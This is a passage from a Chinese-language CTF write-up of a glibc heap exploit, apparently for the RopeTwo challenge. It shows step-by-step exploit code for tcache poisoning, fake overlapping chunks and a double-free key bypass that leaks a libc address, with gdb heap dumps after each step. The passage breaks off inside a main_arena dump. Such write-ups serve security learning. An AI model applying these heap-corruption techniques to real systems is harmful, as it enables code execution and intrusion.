0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000020cf1  &lt;-- end of heap</span><br><span class="line">...[snip]...</span><br><span class="line">-----------------------------------</span><br><span class="line">...[snip]...</span><br><span class="line">                  top: 0x55555555c310 (size : 0x20cf0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x60)   tcache_entry[4](2): 0x55555555c2c0 --&gt; 0x55555555c260  &lt;-- both chunks <span class="keyword">in</span> tcache list</span><br></pre></td></tr></table></figure>

<p>这是可利用的，因为还有一个指向edit2的指针，尽管它已经被释放了。这意味着可以通过编辑2来更改tcache链表。</p>
<h2 id="在堆上得到libc"><a href="#在堆上得到libc" class="headerlink" title="在堆上得到libc"></a>在堆上得到libc</h2><ul>
<li>策略</li>
</ul>
<p>从这个小漏洞到代码执行的路径并不明显。因为ASLR，需要做的第一件事就是从libc泄露一些信息。要做到这一点，首先需要从libc获得一些东西到堆上。当释放这些bins时，它们将进入tcache，这是一堆从libc开始的单链表，然后列表容器中的每一项都是指向下一项的指针。但其他类型是双链表。这意味着每个节点既指向它后面的节点，也指向它前面的节点，因此第一个节点在libc中具有起始节点的地址。可以通过用7个给定大小的bins填充tcache，然后再释放一个bin，将一些东西放入未排序的bins中。</p>
<p>这将需要大量的跳跃，当被限制在只有两个“文件”的程序在同一时间。</p>
<ul>
<li>间距</li>
</ul>
<p>ASLR和Full RELRO将改变每个单词除了低12位以外的所有内容。可以一遍又一遍地运行程序，只要以相同的顺序定义相同的块，每个地址的低12位将是相同的。这意味着可以找到一些地方，在那里可以只覆盖地址中的低字节，从而在不知道高字节的情况下更改它。这也意味着有些时候想从某个特定的空间开始。如果在0x2e0处创建了一个假块，并且不能覆盖当前指向0x320的指针。但是如果在开始时只向堆中添加一小块，并将它们移到0x310和0x350，现在可以用0x10覆盖较低的0x50。</p>
<ul>
<li>假块</li>
</ul>
<p>创建一个假的重叠块，它可以写入下一个块的元数据。可以在上面的示例中选择，但不是第一个块写入任何感兴趣的内容，而是让它写入一些看起来像堆元数据的内容，例如，0x61:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;A&#x27;</span>, 0x40, p64(0)*5 + p64(0x61) + p64(0))   <span class="comment"># A at 260 in f1</span></span><br><span class="line">add(<span class="string">&#x27;B&#x27;</span>, 0x40)                                  <span class="comment"># B at 2b0 in f2</span></span><br></pre></td></tr></table></figure>

<p>当运行这个时，堆看起来像:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051  &lt;-- A meta</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- data, but looks like heap meta</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- B meta</span><br><span class="line">0x55555555c2b0: 0x0000000000000a78      0x0000000000000000  &lt;-- B data</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11  &lt;-- end of heap</span><br></pre></td></tr></table></figure>

<p>释放A，然后释放B，把它编辑为0。然后在添加另一个0x40 bin时，将使两个文件指向同一个位置。从这里开始，移除第一个B将会进入想要攻击的地方:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;A&#x27;</span>)                                         <span class="comment"># A in 0x50 tcache, f1 empty</span></span><br><span class="line">edit(<span class="string">&#x27;B&#x27;</span>, 0)                                    <span class="comment"># B -&gt; A in 0x50 tcache, f2 still B</span></span><br><span class="line">add(<span class="string">&#x27;B2&#x27;</span>, 0x40)                                 <span class="comment"># A in 0x50 tcache, f1 &amp; f2 -&gt; B</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>)                                         <span class="comment"># B -&gt; A in 0x50 tcache, f1 -&gt; B</span></span><br></pre></td></tr></table></figure>

<p>堆循环如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051  &lt;-- A meta</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010  &lt;-- A pointer to next (null) and key</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- fake chunk</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- B meta</span><br><span class="line">0x55555555c2b0: 0x000055555555c260      0x000055555555c010  &lt;-- pointer to A and key</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>当现在用一个字符编辑B2, 0x90，它将覆盖tcache指针:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">&#x27;B2&#x27;</span>, 0x40, <span class="string">&#x27;\x90&#x27;</span>)                        <span class="comment"># B -&gt; fake1 in 0x50 tcache, f1 -&gt; B</span></span><br></pre></td></tr></table></figure>
<p>Heap:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x000055555555c290      0x000055555555c010  &lt;-- now points to fake chunk</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>heapinfo也显示了这个:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x50)   tcache_entry[3](2): 0x55555555c2b0 --&gt; 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) )</span><br></pre></td></tr></table></figure>

<p>如果想要访问这个块，首先需要去掉2b0。不能把它拿出来释放，否则它会回到原来的地方。所以会得到它，把它编辑成更小的大小，然后释放它，让两个更小的块进入tcache，留下假块准备好被使用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;B3&#x27;</span>, 0x40)                                 <span class="comment"># fake in 0x50 tcache, f2 -&gt; B</span></span><br><span class="line">edit(<span class="string">&#x27;B3&#x27;</span>, 0x20)                                <span class="comment"># B-end in 0x20 tcache</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B3&#x27;</span>)                                        <span class="comment"># B in 0x30 tcache</span></span><br></pre></td></tr></table></figure>

<p>现在，将添加一个0x40条目，它将返回290，可以使用它覆盖到b中。在这样做之前，有另一个问题。想释放B2，但不能，因为它会返回一个双自由错误。它正在检查size元数据后面0x10的键，所以需要更改它。幸运的是，有了新的重叠部分。因此，将创建它，使它保持0x51不变，为下一个tcache添加一个null，并更改键。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;fake1&#x27;</span>, 0x40, p64(0)*3 + p64(0x51) + p64(0))</span><br></pre></td></tr></table></figure>

<p>现在堆显示key不再匹配坏值:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x000055555555000a  &lt;-- no pointer and key ends <span class="keyword">in</span> <span class="string">&quot;\x00\x0a&quot;</span> and not <span class="string">&quot;\xc0\x10&quot;</span></span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>将释放B2和fake1，它们都进入tcache，需要一种向任意地址写入的方法时，可以在最后使用它们。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;fake1&#x27;</span>)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>tcache现在看起来像:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0</span><br><span class="line">(0x30)   tcache_entry[1](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br></pre></td></tr></table></figure>

<ul>
<li>第二假块</li>
</ul>
<p>现在，将用大致相同的方式创建另一个假块 (在间隔一些时间之后):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;x&#x27;</span>, 0x30)                                  <span class="comment"># add for spacing, but used later</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;C&#x27;</span>, 0x60)   <span class="comment"># create block to be freed and steal pointer in tcache - C = 340</span></span><br><span class="line">add(<span class="string">&#x27;D&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + p64(0)) <span class="comment"># create block and fake block to put fake block meta in place - D = 3b0</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;D&#x27;</span>) <span class="comment"># D in tcache 0x80</span></span><br><span class="line">add(<span class="string">&#x27;E&#x27;</span>, 0x60, p64(0x21)*11)   <span class="comment"># create second 0x60, E, and spray with 0x21 for next block meta fake later, E = 430</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;C&#x27;</span>)               <span class="comment"># f1 empty, C in 0x70 tcache</span></span><br><span class="line">edit(<span class="string">&#x27;E&#x27;</span>, 0)      <span class="comment"># slot 2 -&gt; E, E-&gt;C in 0x70 tcache</span></span><br><span class="line">add(<span class="string">&#x27;E2&#x27;</span>, 0x60)  <span class="comment"># slots 1 and 2 -&gt; E, C in 0x70 tcache</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;E&#x27;</span>)               <span class="comment"># slot 1 -&gt; E, E -&gt; C in 0x70 tache</span></span><br><span class="line">edit(<span class="string">&#x27;E2&#x27;</span>, 0x60, b<span class="string">&#x27;\xe0&#x27;</span>) <span class="comment"># edit tcache pointer, C -&gt; fake2 in 0x70 tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># next three fetch C from tcache, and get rid of it without putting it back in 0x70 tcache</span></span><br><span class="line">add(<span class="string">&#x27;E3&#x27;</span>, 0x60)   <span class="comment"># fetch E, fake in 0x70 tcache</span></span><br><span class="line">edit(<span class="string">&#x27;E3&#x27;</span>, 0x20)  <span class="comment"># E-end in 0x30 tcache</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;E3&#x27;</span>)          <span class="comment"># E in 0x50 tcache</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;fake2&#x27;</span>, 0x60, p64(0)*9 + p64(0x31) + p64(0))   <span class="comment"># get fake block, change key for E</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;E2&#x27;</span>) <span class="comment"># C</span></span><br><span class="line">add(<span class="string">&#x27;B&#x27;</span>, 0x70) <span class="comment"># B</span></span><br></pre></td></tr></table></figure>

<p>在这里做同样的事情，尽管这次有另一个块，在偷取指针的那个块和有那个指针的那个块之间。最后，留下了两个重叠块的句柄。假块报告的大小是0xa1(尽管不能在这个程序中创建那么大的块)，另一个是在它能够写入这个块之前。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x000055555555c3b0] B       : x</span><br><span class="line">[0x000055555555c3e0] fake2   : </span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000081  &lt;-- B meta</span><br><span class="line">0x55555555c3b0: 0x0000000000000a78      0x0000000000000000</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x00000000000000a1  &lt;-- fake2 meta</span><br><span class="line">0x55555555c3e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000031  &lt;-- E meta</span><br><span class="line">-----------------------------------</span><br><span class="line">...[snip]...</span><br><span class="line">                  top: 0x55555555c490 (size : 0x20b70) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0</span><br><span class="line">(0x30)   tcache_entry[1](3): 0x55555555c430 --&gt; 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )</span><br><span class="line">(0x40)   tcache_entry[2](2): 0x55555555c460 --&gt; 0x55555555c300</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br></pre></td></tr></table></figure>

<ul>
<li>得到未分类的bin</li>
</ul>
<p>这允许做的是释放fake2，然后使用B来更改密钥，然后再次释放它。将总共释放它8次，前7次进入tcache，最后一次进入未排序的bins，这将把双链表指针留在堆上。还需要确保一个元数据后面的0xa0字节是一个有效的元数据，这就是为什么当创建E时，在里面喷洒了很多0x21字节。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放fake来填充tcache, 然后从保护双重free覆盖key</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(7):</span><br><span class="line">    edit(<span class="string">&#x27;fake2&#x27;</span>, 0x0)    <span class="comment"># 空闲的假块，把3e0放到0xa0 tcache中</span></span><br><span class="line">    edit(<span class="string">&#x27;B&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + p64(0) + chr(i).encode()) <span class="comment"># B</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>) <span class="comment"># B</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;fake2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>现在打开了两个文件，栈上有一个libc地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000081</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x55555555c3e0: 0x00007ffff7fc3ca0      0x00007ffff7fc3ca0  &lt;-- libc meta</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000031</span><br><span class="line">-----------------------------------</span><br><span class="line">                  top: 0x55555555c490 (size : 0x20b70) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x55555555c3d0 (overlap chunk with 0x55555555c420(freed) )</span><br><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0</span><br><span class="line">(0x30)   tcache_entry[1](3): 0x55555555c430 --&gt; 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )</span><br><span class="line">(0x40)   tcache_entry[2](2): 0x55555555c460 --&gt; 0x55555555c300</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x80)   tcache_entry[6](1): 0x55555555c3b0</span><br><span class="line">(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c420(freed) )  &lt;-- actually 7 <span class="keyword">in</span> there, but only shows once</span><br></pre></td></tr></table></figure>

<ul>
<li>这个指针是什么?</li>
</ul>
<p>让gdb打印这个地址显示它在main_arena:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/xg 0x00007ffff7fc3ca0</span><br><span class="line">0x7ffff7fc3ca0 &lt;main_arena+96&gt;: 0x000055555555c490</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cDovL2NvcmUtYW5hbHl6ZXIuc291cmNlZm9yZ2UubmV0L2luZGV4X2ZpbGVzL1BhZ2UzMzUuaHRtbA==">这篇文章<i class="fa fa-external-link-alt"></i></span>很好地解释了main_arena是什么:</p>
<p><em><strong>库glibc有一个全局的“struct malloc_state”对象，名为main_arena，它是所有托管堆内存的root。</strong></em></p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ropetwo-rshell.jpg"></li>
</ul>
<p>gdb显示了它如何包含堆中使用的所有不同指针的:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p main_arena</span><br><span class="line"><span class="variable">$1</span> = &#123;mutex = 0, flags = 0, have_fastchunks = 0, fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, top = 0x55555555c490, last_remainder = 0x0, bins = &#123;0x55555555c3d0, 0x55555555c3d0, 0x7ffff7fc3cb0 &lt;main_arena+112&gt;, 0x7ffff7fc3cb0 &lt;main_arena+112&gt;, 0x7ffff7fc3cc0 &lt;main_arena+128&gt;, 0x7ffff7fc3cc0 &lt;main_arena+128&gt;, 0x7ffff7fc3cd0 &lt;main_arena+144&gt;, 0x7ffff7fc3cd0 &lt;main_arena+144&gt;, 0x7ffff7fc3ce0 &lt;main_arena+160&gt;, 0x7ffff7fc3ce0 &lt;main_arena+160&gt;, 0x7ffff7fc3cf0 &lt;main_arena+176&gt;, 0x7ffff7fc3cf0 &lt;main_arena+176&gt;, 0x7ffff7fc3d00 &lt;main_arena+192&gt;, 0x7ffff7fc3d00 &lt;main_arena+192&gt;, 0x7ffff7fc3d10 &lt;main_arena+208&gt;, 0x7ffff7fc3d10 &lt;main_arena+208&gt;, 0x7ffff7fc3d20 &lt;main_arena+224&gt;, 0x7ffff7fc3d20 &lt;main_arena+224&gt;, 0x7ffff7fc3d30 &lt;main_arena+240&gt;, 0x7ffff7fc3d30 &lt;main_arena+240&gt;, 0x7ffff7fc3d40 &lt;main_arena+256&gt;, 0x7ffff7fc3d40 &lt;main_arena+256&gt;, 0x7ffff7fc3d50 &lt;main_arena+272&gt;, 0x7ffff7fc3d50 &lt;main_arena+272&gt;, 0x7ffff7fc3d60 &lt;main_arena+288&gt;, 0x7ffff7fc3d60 &lt;main_arena+288&gt;, 0x7ffff7fc3d70 &lt;main_arena+304&gt;, 0x7ffff7fc3d70 &lt;main_arena+304&gt;, 0x7ffff7fc3d80 &lt;main_arena+320&gt;, 0x7ffff7fc3d80 &lt;main_arena+320&gt;, 0x7ffff7fc3d90 &lt;main_arena+336&gt;, 0x7ffff7fc3d90 &lt;main_arena+336&gt;, 0x7ffff7fc3da0 &lt;main_arena+352&gt;, 0x7ffff7fc3da0 &lt;main_arena+352&gt;, 0x7ffff7fc3db0 &lt;main_arena+368&gt;, 0x7ffff7fc3db0 &lt;main_arena+368&gt;, 0x7ffff7fc3dc0 &lt;main_arena+384&gt;, 0x7ffff7fc3dc0 &lt;main_arena+384&gt;, 0x7ffff7fc3dd0 &lt;main_arena+400&gt;, 0x7ffff7fc3dd0 &lt;main_arena+400&gt;, 0x7ffff7fc3de0 &lt;main_arena+416&gt;, 0x7ffff7fc3de0 &lt;main_arena+416&gt;, 0x7ffff7fc3df0 &lt;main_arena+432&gt;, 0x7ffff7fc3df0 &lt;main_arena+432&gt;, 0x7ffff7fc3e00 &lt;main_arena+448&gt;, 0x7ffff7fc3e00 &lt;main_arena+448&gt;, 0x7ffff7fc3e10 &lt;main_arena+464&gt;, 0x7ffff7fc3e10 &lt;main_arena+464&gt;, 0x7ffff7fc3e20 &lt;main_arena+480&gt;, 0x7ffff7fc3e20 &lt;main_arena+480&gt;, 0x7ffff7fc3e30 &lt;main_arena+496&gt;, 0x7ffff7fc3e30 &lt;main_arena+496&gt;, 0x7ffff7fc3e40 &lt;main_arena+512&gt;, 0x7ffff7fc3e40 &lt;main_arena+512&gt;, 0x7ffff7fc3e50 &lt;main_arena+528&gt;, 0x7ffff7fc3e50 &lt;main_arena+528&gt;, 0x7ffff7fc3e60 &lt;main_arena+544&gt;, 0x7ffff7fc3e60 &lt;main_arena+544&gt;, 0x7ffff7fc3e70 &lt;main_arena+560&gt;, 0x7ffff7fc3e70 &lt;main_arena+560&gt;, 0x7ffff7fc3e80 &lt;main_arena+576&gt;, 0x7ffff7fc3e80 &lt;main_arena+576&gt;, 0x7ffff7fc3e90 &lt;main_arena+592&gt;, 0x7ffff7fc3e90 &lt;main_arena+592&gt;, 0x7ffff7fc3ea0 &lt;main_arena+608&gt;, 0x7ffff7fc3ea0 &lt;main_arena+608&gt;, 0x7ffff7fc3eb0 &lt;main_arena+624&gt;, 0x7ffff7fc3eb0 &lt;main_arena+624&gt;, 0x7ffff7fc3ec0 &lt;main_arena+640&gt;, 0x7ffff7fc3ec0 &lt;main_arena+640&gt;, 0x7ffff7fc3ed0 &lt;main_arena+656&gt;, 0x7ffff7fc3ed0 &lt;main_arena+656&gt;, 0x7ffff7fc3ee0 &lt;main_arena+672&gt;, 0x7ffff7fc3ee0 &lt;main_arena+672&gt;, 0x7ffff7fc3ef0 &lt;main_arena+688&gt;, 0x7ffff7fc3ef0 &lt;main_arena+688&gt;, 0x7ffff7fc3f00 &lt;main_arena+704&gt;, 0x7ffff7fc3f00 &lt;main_arena+704&gt;, 0x7ffff7fc3f10 &lt;main_arena+720&gt;, 0x7ffff7fc3f10 &lt;main_arena+720&gt;, 0x7ffff7fc3f20 &lt;main_arena+736&gt;, 0x7ffff7fc3f20 &lt;main_arena+736&gt;, 0x7ffff7fc3f30 &lt;main_arena+752&gt;, 0x7ffff7fc3f30 &lt;main_arena+752&gt;, 0x7ffff7fc3f40 &lt;main_arena+768&gt;, 0x7ffff7fc3f40 &lt;main_arena+768&gt;, 0x7ffff7fc3f50 &lt;main_arena+784&gt;, 0x7ffff7fc3f50 &lt;main_arena+784&gt;, 0x7ffff7fc3f60 &lt;main_arena+800&gt;, 0x7ffff7fc3f60 &lt;main_arena+800&gt;, 0x7ffff7fc3f70 &lt;main_arena+816&gt;, 0x7ffff7fc3f70 &lt;main_arena+816&gt;, 0x7ffff7fc3f80 &lt;main_arena+832&gt;, 0x7ffff7fc3f80 &lt;main_arena+832&gt;, 0x7ffff7fc3f90 &lt;main_arena+848&gt;, 0x7ffff7fc3f90 &lt;main_arena+848&gt;, 0x7ffff7fc3fa0 &lt;main_arena+864&gt;, 0x7ffff7fc3fa0 &lt;main_arena+864&gt;, 0x7ffff7fc3fb0 &lt;main_arena+880&gt;, 0x7ffff7fc3fb0 &lt;main_arena+880&gt;, 0x7ffff7fc3fc0 &lt;main_arena+896&gt;, 0x7ffff7fc3fc0 &lt;main_arena+896&gt;, 0x7ffff7fc3fd0 &lt;main_arena+912&gt;, 0x7ffff7fc3fd0 &lt;main_arena+912&gt;, 0x7ffff7fc3fe0 &lt;main_arena+928&gt;, 0x7ffff7fc3fe0 &lt;main_arena+928&gt;, 0x7ffff7fc3ff0 &lt;main_arena+944&gt;, 0x7ffff7fc3ff0 &lt;main_arena+944&gt;, 0x7ffff7fc4000 &lt;main_arena+960&gt;, 0x7ffff7fc4000 &lt;main_arena+960&gt;, 0x7ffff7fc4010 &lt;main_arena+976&gt;, 